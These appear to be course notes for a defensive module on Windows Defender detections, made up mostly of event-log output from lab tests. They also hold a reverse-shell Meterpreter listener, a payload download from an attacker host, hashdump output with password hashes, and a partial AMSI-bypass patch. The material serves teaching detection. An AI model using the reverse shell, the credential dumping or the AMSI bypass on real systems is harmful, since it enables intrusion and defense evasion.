# Module 12: Antivirus Alerts and Evasion

## Antivirus Basics

### Antivirus Overview

_Not much of note to add here._

### Signature-Based Detection

An antivirus signature is a continuous sequence of bytes within malware that uniquely identify it. Signature-based anitivirus detection is mostly considered a _denylist technology_. This _can_ still be quite effective however an attacker aware of the signature could adjust very minor parts of their malware to evade this detection.

_Signature detection of signature\_detect\_nonstage.exe from manual file scan_

{% code overflow="wrap" %}
```powershell
C:\Program Files\Windows Defender>MpCmdRun -Scan -ScanType 3 -File C:\tools\av_alerts_evasion\signature_detect_nonstage.exe -DisableRemediation 
Scan starting...
Scan finished.
Scanning C:\tools\av_alerts_evasion\signature_detect_nonstage.exe found 1 threats.

<===========================LIST OF DETECTED THREATS==========================>
----------------------------- Threat information ------------------------------
Threat                  : Trojan:Win64/Meterpreter.A
Resources               : 1 total
    file                : C:\tools\av_alerts_evasion\signature_detect_nonstage.exe
-------------------------------------------------------------------------------
```
{% endcode %}

There isn't much useful information provided here, however we can take a look at the Windows Defender _provider_ for Windows Event Log. _Microsoft-Windows-Windows Defender/Operational_

_Initiating a manual scan of signature\_detect\_nonstage.exe using Start-MpScan_

{% code overflow="wrap" %}
```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Start-MpScan -ScanPath C:\tools\av_alerts_evasion\signature_detect_nonstage.exe -ScanType CustomScan; Get-Date

Thursday, December 2, 2021 10:59:31 AM
```
{% endcode %}

After importing the custom Get-WDLog.psm1...

_Windows Defender detection of potentially-malicious threat_

{% code overflow="wrap" %}
```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-WDLogEvent $null "12/2/2021 10:59:00" "12/2/2021 11:00:00"

   ProviderName: Microsoft-Windows-Windows Defender

TimeCreated                      Id LevelDisplayName Message    
-----------                      -- ---------------- -------
12/2/2021 10:59:21 AM          1116 Warning          Microsoft Defender Antivirus has detected malware or other potentially unwanted software....  
```
{% endcode %}

_Full message listing of malicious event_

{% code overflow="wrap" %}
```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-WDLogEvent 1116 "12/2/2021 10:59:20" "12/2/2021 11:59:22" | Format-List

TimeCreated  : 12/2/2021 10:59:21 AM
ProviderName : Microsoft-Windows-Windows Defender
Id           : 1116
Message      : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
                For more information please see the following:
               https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win64/Meterpreter.A&threatid=2147720175&enterprise=0
                        Name: Trojan:Win64/Meterpreter.A
                        ID: 2147720175
                        Severity: Severe
                        Category: Trojan
                        Path: file:_C:\tools\av_alerts_evasion\signature_detect_nonstage.exe
                        Detection Origin: Local machine
                        Detection Type: Concrete
                        Detection Source: System
                        User: NT AUTHORITY\LOCAL SERVICE
                        Process Name: Unknown
                        Security intelligence Version: AV: 1.303.25.0, AS: 1.303.25.0, NIS: 0.0.0.0
                        Engine Version: AM: 1.1.16400.2, NIS: 0.0.0.0
```
{% endcode %}

Because Meterpreter provides remote access to the endpoint for active compromise, Windows Defender has rated it as "Severe". The _Category_ field is a free-form guess as to the type of malware. In this case, a remote-access Trojan. With "Concrete" as the _Detection Type_, we can confirm that this is a signature-based detection. Both the _User_ and the _Detection Origin_ fields indicate where the detection was initiated. Because we initiated the Start-MpScan cmdlet from a remote connection, the source is _System_ and the user is _LOCAL SERVICE_. Had we initiated it from the Windows 10 VM, the Detection Origin would be "User" and the User field would contain the domain/user information.

Defender keeps a list of threats detected and can be queried with **Get-MpThreat**.

_Output from Get-MpThreat containing signature\_detect\_nonstage.exe_

```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-MpThreat

CategoryID       : 8
DidThreatExecute : False
IsActive         : True
Resources        : {file:_C:\tools\av_alerts_evasion\signature_detect_nonstage.exe}
RollupStatus     : 1
SchemaVersion    : 1.0.0.0
SeverityID       : 5
ThreatID         : 2147720175
ThreatName       : Trojan:Win64/Meterpreter.A
TypeID           : 0
PSComputerName   : 
```

The queue of threats can be cleared with **Remove-MpThreat**.

_Using Remove-MpThreat to clear the queue_

```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Remove-MpThreat; Get-Date

Thursday, December 2, 2021 11:08:08 AM
```

_Windows Defender removal of potentially-malicious threat_

{% code overflow="wrap" %}
```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-WDLogEvent $null "12/2/2021 11:08:00" "12/2/2021 11:09:00"

   ProviderName: Microsoft-Windows-Windows Defender

TimeCreated                       Id LevelDisplayName Message
-----------                       -- ---------------- -------
12/2/2021 11:08:08 AM           1117 Information      Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.... 
```
{% endcode %}

_Full content of Windows Defender mitigation event_

{% code overflow="wrap" %}
```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-WDLogEvent 1117 "12/2/2021 11:08:07" "12/2/2021 11:08:09" | Format-List

TimeCreated  : 12/2/2021 11:08:08 AM
ProviderName : Microsoft-Windows-Windows Defender
Id           : 1117
Message      : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
                For more information please see the following:
               https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win64/Meterpreter.A&threatid=2147720175&enterprise=0
                        Name: Trojan:Win64/Meterpreter.A
                        ID: 2147720175
                        Severity: Severe
                        Category: Trojan
                        Path: file:_C:\tools\av_alerts_evasion\signature_detect_nonstage.exe
                        Detection Origin: Local machine
                        Detection Type: Concrete
                        Detection Source: System
                        User: NT AUTHORITY\LOCAL SERVICE
                        Process Name: Unknown
                        Action: Remove
                        Action Status:  No additional actions required
                        Error Code: 0x00000000
                        Error description: The operation completed successfully. 
                        Security intelligence Version: AV: 1.303.25.0, AS: 1.303.25.0, NIS: 0.0.0.0
                        Engine Version: AM: 1.1.16400.2, NIS: 0.0.0.0
```
{% endcode %}

Definitions of malware and various categories are updated and stored in **%PROGRAMDATA%\Microsoft\Windows Defender\Definition Updates\Default**.

### Real-time Heuristic and Behavioral-Based Detection

Real-time protection also uses _heuristic-based detection_ and _behavior-based detection_ to identify malicious activities taking place on an endpoint.

Heuristic-based detections rely on rules and algorithms to determine if an action is malicious. This is typically done by stepping through the instruction set of a binary file, or by attempting to decompile and analyze the source code.

Behavior-based detections dynamically analyze the behavior by executing the file in an emulated environment (sandbox) and determining if the actions taken are considered malicious.

<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption><p>Real-time Protection group policy options</p></figcaption></figure>

{% hint style="info" %}
When activating real-time protection, Windows Defender will generate a configuration change with Event ID 5007. The HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection key in the Windows Registry will change from 0x0 to 0x1.
{% endhint %}

{% code overflow="wrap" %}
```powershell
PS C:\tools\av_alerts_evasion> Invoke-Webrequest -Uri http://kali:8000/signature_detect_staged.exe -OutFile signature_detect_staged.exe; Get-Date

Wednesday, December 15, 2021 7:13:33 AM
```
{% endcode %}

_Windows Defender Real-time protection detection of potentially-malicious threat_

{% code overflow="wrap" %}
```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-WDLogEvent $null "12/15/2021 7:13:00" "12/15/2021 7:14:00"

   ProviderName: Microsoft-Windows-Windows Defender

TimeCreated                      Id LevelDisplayName Message    
-----------                      -- ---------------- -------
12/15/2021 7:13:34 AM          1116 Warning          Microsoft Defender Antivirus has detected malware or other potentially unwanted software.... 
```
{% endcode %}

_Full message listing of malicious detection event for signature\_detect\_staged.exe_

{% code overflow="wrap" %}
```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-WDLogEvent 1116 "12/15/2021 7:13:33" "12/15/2021 7:13:35" | Format-List

TimeCreated  : 12/15/2021 7:13:34 AM
ProviderName : Microsoft-Windows-Windows Defender
Id           : 1116
Message      : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
                For more information please see the following:
               https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win64/Meterpreter.B&threatid=2147721790&enterprise=0
                        Name: Trojan:Win64/Meterpreter.B
                        ID: 2147721790
                        Severity: Severe
                        Category: Trojan
                        Path: file:_C:\tools\av_alerts_evasion\signature_detect_staged.exe
                        Detection Origin: Local machine
                        Detection Type: Concrete
                        Detection Source: Real-Time Protection
                        User: CLIENT02\offsec
                        Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                        Security intelligence Version: AV: 1.303.25.0, AS: 1.303.25.0, NIS: 1.303.25.0
                        Engine Version: AM: 1.1.16400.2, NIS: 1.1.16400.2
```
{% endcode %}

_FileCreate event for signature\_detect\_staged.exe_

{% code overflow="wrap" %}
```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-SysmonEvent 11 "12/15/2021 7:13:30" "12/15/2021 7:13:35" | Format-List

TimeCreated  : 12/15/2021 7:13:33 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 11
Message      : File created:
               RuleName: EXE
               UtcTime: 2021-12-15 15:13:33.632
               ProcessGuid: {28a02d86-02e8-61ba-f801-000000002300}
               ProcessId: 3104
               Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
               TargetFilename: C:\tools\av_alerts_evasion\signature_detect_staged.exe
               CreationUtcTime: 2021-12-15 15:13:33.632
```
{% endcode %}

_Using Remove-MpThreat to mitigate threats discovered by Windows Defender_

```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Remove-MpThreat; Get-Date

Wednesday, December 15, 2021 8:30:48 AM
```

_Full contents of Windows Defender mitigation event for signature\_detect\_staged.exe_

{% code overflow="wrap" %}
```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-WDLogEvent 1117 "12/15/2021 8:30:47" "12/15/2021 8:30:49" | Format-List

TimeCreated  : 12/15/2021 8:30:47 AM
ProviderName : Microsoft-Windows-Windows Defender
Id           : 1117
Message      : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
                For more information please see the following:
               https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win64/Meterpreter.B&threatid=2147721790&enterprise=0
                        Name: Trojan:Win64/Meterpreter.B
                        ID: 2147721790
                        Severity: Severe
                        Category: Trojan
                        Path: file:_C:\tools\av_alerts_evasion\signature_detect_staged.exe
                        Detection Origin: Local machine
                        Detection Type: Concrete
                        Detection Source: Real-Time Protection
                        User: NT AUTHORITY\LOCAL SERVICE
                        Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                        Action: Remove
                        Action Status:  No additional actions required
                        Error Code: 0x00000000
                        Error description: The operation completed successfully. 
                        Security intelligence Version: AV: 1.303.25.0, AS: 1.303.25.0, NIS: 1.303.25.0
                        Engine Version: AM: 1.1.16400.2, NIS: 1.1.16400.2
```
{% endcode %}

Because **Remove-MpThreat** was run from PowerShell Core, the User is logged as _NT AUTHORITY\LOCAL SERVICE_.

_Setting up listener for the undetected payload execution_

{% code overflow="wrap" %}
```bash
kali@attacker01:~/SOC-200/Antivirus_Alerts_and_Evasion$ ./rtp_behavior_listen.sh 192.168.51.50
Initiating... please wait
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_winhttps
LPORT => 443
LHOST => 192.168.51.50
AutoRunScript => multi_console_command -r /home/kali/SOC-200/Antivirus_Alerts_and_Evasion/rtp_behavior.rc
[*] Started HTTPS reverse handler on https://192.168.51.50:443
```
{% endcode %}

_Executing generic\_winhttps\_connect_

{% code overflow="wrap" %}
```powershell
PS C:\tools\av_alerts_evasion> .\generic_winhttps_connect.exe; Get-Date

Thursday, December 16, 2021 2:18:15 PME
```
{% endcode %}

_Meterpreter connection and commands_

{% code overflow="wrap" %}
```bash
kali@attacker01:~/SOC-200/Antivirus_Alerts_and_Evasion$ ./rtp_behavior_listen.sh 192.168.51.50
Initiating... please wait
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_winhttps
LPORT => 443
LHOST => 192.168.51.50
AutoRunScript => multi_console_command -r /home/kali/SOC-200/Antivirus_Alerts_and_Evasion/rtp_behavior.rc
[*] Started HTTPS reverse handler on https://192.168.51.50:443
[*] https://192.168.51.50:443 handling request from 192.168.51.14; (UUID: 8xk27bby) Staging x64 payload (201308 bytes) ...
[*] Session ID 1 (192.168.51.50:443 -> 127.0.0.1 ) processing AutoRunScript 'multi_console_command -r /home/kali/SOC-200/Antivirus_Alerts_and_Evasion/rtp_behavior.rc'
[*] Running Command List ...
[*]     Running command hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
offsec:1001:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7ddade167a491d4f28eb25728469310e:::
[*]     Running command sysinfo
Computer        : CLIENT02
OS              : Windows 10 (10.0 Build 19042).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 5
Meterpreter     : x64/windows
[*] Meterpreter session 1 opened (192.168.51.50:443 -> 127.0.0.1 ) at 2021-12-16 17:18:32 -0500

meterpreter > 
```
{% endcode %}

_Malicious detections based on suspicious behavior_

{% code overflow="wrap" %}
```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-WDLogEvent $null "12/16/2021 14:18:00" "12/16/2021 14:19:00"

   ProviderName: Microsoft-Windows-Windows Defender

TimeCreated                      Id LevelDisplayName Message

-----------                      -- ---------------- -------
12/16/2021 2:18:43 PM          1116 Warning          Microsoft Defender Antivirus has detected malware or other potentially unwanted software....                                                                           
12/16/2021 2:18:43 PM          1116 Warning          Microsoft Defender Antivirus has detected malware or other potentially unwanted software....
```
{% endcode %}

_Full listing of above detections_

{% code overflow="wrap" %}
```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-WDLogEvent 1116 "12/16/2021 14:18:42" "12/16/2021 14:18:44" | Format-List

TimeCreated  : 12/16/2021 2:18:43 PM
ProviderName : Microsoft-Windows-Windows Defender
Id           : 1116
Message      : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
                For more information please see the following:
               https://go.microsoft.com/fwlink/?linkid=37020&name=Behavior:Win32/Meterpreter.gen!D&threatid=2147728104&enterprise=0
                        Name: Behavior:Win32/Meterpreter.gen!D
                        ID: 2147728104
                        Severity: Severe
                        Category: Suspicious Behavior
                        Path: behavior:_pid:5420:56844127554067; file:_C:\tools\av_alerts_evasion\generic_winhttps_connect.exe; process:_pid:5420,ProcessStart:132841666953648975
                        Detection Origin: Local machine
                        Detection Type: Generic
                        Detection Source: System
                        User: NT AUTHORITY\SYSTEM
                        Process Name: C:\tools\av_alerts_evasion\generic_winhttps_connect.exe
                        Security intelligence Version: AV: 1.303.25.0, AS: 1.303.25.0, NIS: 1.303.25.0
                        Engine Version: AM: 1.1.16400.2, NIS: 1.1.16400.2

TimeCreated  : 12/16/2021 2:18:43 PM
ProviderName : Microsoft-Windows-Windows Defender
Id           : 1116
Message      : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
                For more information please see the following:
               https://go.microsoft.com/fwlink/?linkid=37020&name=Behavior:Win32/Meterpreter.gen!A&threatid=2147723573&enterprise=0
                        Name: Behavior:Win32/Meterpreter.gen!A
                        ID: 2147723573
                        Severity: Severe
                        Category: Suspicious Behavior
                        Path: behavior:_pid:5420:74439734262196; process:_pid:5420,ProcessStart:132841666953648975
                        Detection Origin: Unknown
                        Detection Type: Generic
                        Detection Source: System
                        User: NT AUTHORITY\SYSTEM
                        Process Name: C:\tools\av_alerts_evasion\generic_winhttps_connect.exe
                        Security intelligence Version: AV: 1.303.25.0, AS: 1.303.25.0, NIS: 1.303.25.0
                        Engine Version: AM: 1.1.16400.2, NIS: 1.1.16400.2
```
{% endcode %}

## Antimalware Scan Interface (AMSI)

### Understanding AMSI

<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption><p>AMSI implementation overview</p></figcaption></figure>

_AMSI blocking a malicious string_

```powershell
PS C:\av_alerts_evasion> Get-Date

Tuesday, December 21, 2021 8:00:02 AM

PS C:\Users\offsec> "amsiutils"
At line:1 char:1
+ "amsiutils"
+ ~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

{% hint style="info" %}
Note that using a large number of AMSI trigger strings while testing may cause Windows Defender to "panic" and suddenly consider everything malicious. At this point, the only remedies are to reboot the system or revert the VM groups.
{% endhint %}

_Full event of malicious detection by AMSI_

{% code overflow="wrap" %}
```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-WDLogEvent 1116 "12/21/2021 8:00:00" "12/21/2021 8:01:00" | Format-List 

TimeCreated  : 12/21/2021 8:00:06 AM
ProviderName : Microsoft-Windows-Windows Defender
Id           : 1116
Message      : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
                For more information please see the following:
               https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/AmsiTamper.A!ams&threatid=2147728399&enterprise=0
                        Name: Trojan:Win32/AmsiTamper.A!ams
                        ID: 2147728399
                        Severity: Severe
                        Category: Trojan
                        Path: amsi:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                        Detection Origin: Unknown
                        Detection Type: Concrete
                        Detection Source: AMSI
                        User: CLIENT02\offsec
                        Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                        Security intelligence Version: AV: 1.303.25.0, AS: 1.303.25.0, NIS: 1.303.25.0
                        Engine Version: AM: 1.1.16400.2, NIS: 1.1.16400.2
```
{% endcode %}

### Bypassing AMSI

There are ways to bypass AMSI, a couple are:

1. Directly overwriting the _AmsiScanBuffer_ function.

_Full Script Block event with an AMSI bypass script_

```powershell
[192.168.51.14]: PS C:\Users\offsec\Documents> Get-PSLogEvent 4104 "12/22/2021 8:41:24" "12/22/2021 8:41:26" | Where-Object { $_.LevelDisplayName -eq "Warning" } | Format-List

TimeCreated  : 12/22/2021 8:41:24 AM
ProviderName : Microsoft-Windows-PowerShell
Id           : 4104
Message      : Creating Scriptblock text (1 of 1):
               Write-Host "-- AMSI Patch"
               Write-Host "-- Paul LaÃ®nÃ© (@am0nsec)"
               Write-Host ""
               
...
               
               $patch = [byte[]] (
                   0x31, 0xC0,    # xor rax, rax
                   0xC3           # ret  
               )
               [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)
               
               $a = 0
               [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
               
               
               ScriptBlock ID: 41836c45-f6b5-4d6c-a5c1-e96adfc720be
               Path: 
```

2. Without going into detail, security researchers have found that the _AmsiInitializ&#x65;_&#x66;unction creates an undocumented context structure, which is used repeatedly by other functions in AMSI. Theoretically, if this unknown region of memory were corrupted or otherwise neutralized, AMSI would stop working altogether.
